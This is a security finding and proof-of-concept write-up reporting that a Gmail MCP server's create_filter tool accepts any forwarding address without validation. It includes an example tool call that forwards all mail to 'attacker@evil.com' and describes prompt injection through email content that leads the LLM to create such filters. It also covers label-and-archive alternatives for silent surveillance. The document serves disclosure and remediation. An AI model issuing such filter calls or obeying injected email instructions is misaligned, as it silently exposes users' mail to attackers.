# PoC: Persistent Email Exfiltration via Filter Forwarding (C2/F12)

## Finding

| Field | Value |
|---|---|
| **Severity** | Critical (in confused deputy context) |
| **Taxonomy** | CD (Confused Deputy), SE (Scope Escalation) |
| **OWASP LLM** | LLM06 (Excessive Agency) |
| **Affected** | `src/index.ts:961-984`, `src/filter-manager.ts:38-57` |
| **CVSS 3.1** | 8.7 (High) — AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N |

## Summary

The `create_filter` tool allows creating Gmail filters with a `forward` action that auto-forwards all matching emails to an arbitrary email address. There is:
- **No validation** of the forwarding address
- **No allowlist/blocklist** for forwarding destinations
- **No server-side confirmation** before creating the filter
- **No rate limiting** on filter creation

Combined with prompt injection via email content (H4), this enables persistent, silent email surveillance.

## Vulnerable Code

### Filter Creation — No Forward Address Validation

```typescript
// src/filter-manager.ts:38-48
export async function createFilter(gmail: any, criteria: GmailFilterCriteria, action: GmailFilterAction) {
    const filterBody: GmailFilter = {
        criteria,   // Passed directly — no validation
        action      // forward field accepted without check
    };

    const response = await gmail.users.settings.filters.create({
        userId: 'me',
        requestBody: filterBody,
    });
    return response.data;
}
```

### Schema — Forward is Unvalidated String

```typescript
// src/index.ts:284
forward: z.string().optional().describe("Email address to forward matching emails to")
```

`z.string()` — no email format validation, no domain restriction.

## Attack Chain

### Direct Attack (requires LLM cooperation or auto-approve)

```
User → LLM: "Help me organize my email"
LLM → create_filter: {
    criteria: { query: "in:anywhere" },
    action: { forward: "attacker@evil.com" }
}
```

### Injection-Mediated Attack

1. Attacker sends email to victim with injection payload (see `prompt-injection-payloads.md`, payload B3)
2. Victim asks LLM to read/summarize emails
3. LLM processes injection, calls `create_filter`
4. Filter silently forwards all future email to attacker

### Why This Is Worse Than `send_email`

| Property | `send_email` | `create_filter` with `forward` |
|---|---|---|
| Scope | Single email | All future matching emails |
| Persistence | One-time | Permanent until deleted |
| Visibility | Appears in "Sent" folder | No per-email notification |
| Survives server shutdown | N/A | Yes — stored in Gmail servers |
| Detection difficulty | Easy (check Sent) | Hard (hidden in Settings > Filters) |

## Gmail API Forwarding Verification

**Important Gmail API behavior:** The `users.settings.filters.create` API with a `forward` action has a prerequisite — the forwarding address must first be added and verified via `users.settings.forwardingAddresses.create`. Without this, the API returns a 400 error.

This means:
1. **Direct filter forwarding may fail** at the Gmail API level if the address isn't pre-verified
2. **However**, the MCP server does not handle or communicate this error gracefully — it just returns `"Invalid filter criteria or action: [error]"`
3. **The server does expose enough capability** to work around this via other tools or social engineering

### Alternative Exfiltration Without Forwarding Verification

Even if Gmail API blocks unverified forwarding addresses, the attacker can still achieve persistent surveillance by:

1. **Label + search chain:** Create filter that labels matching emails with a distinctive label, then periodically search for that label and exfiltrate via `send_email`
2. **Auto-archive attack:** Create filter with `removeLabelIds: ['INBOX']` to silently archive emails matching sensitive criteria, preventing the user from seeing them

## Test Plan

### C1: Direct Filter Creation Test

```
Step 1: Ask Claude to create a filter forwarding to test address
Step 2: Observe whether Gmail API accepts or rejects (forwarding address verification)
Step 3: If filter created, immediately delete it via delete_filter
Step 4: Document the Gmail API's actual enforcement behavior
```

### Expected Results

| Scenario | Expected | Impact |
|---|---|---|
| Forward to unverified address | Gmail API 400 error | Mitigated by Gmail API (not by MCP server) |
| Forward to verified address | Filter created successfully | Full persistent exfiltration |
| Label-only filter | Filter created successfully | Staging for search+send exfiltration |
| Archive filter (remove INBOX) | Filter created successfully | Email hiding/denial of service |

## Remediation

1. **Validate forwarding addresses** against a user-configured allowlist
2. **Require explicit confirmation** for filter creation (especially with `forward` action)
3. **Add safety context** to the `create_filter` tool description warning the LLM about forwarding capability
4. **Log all filter operations** for audit trail
5. **Consider removing the `forward` action** entirely — forwarding can be handled through other Gmail UI mechanisms with proper verification
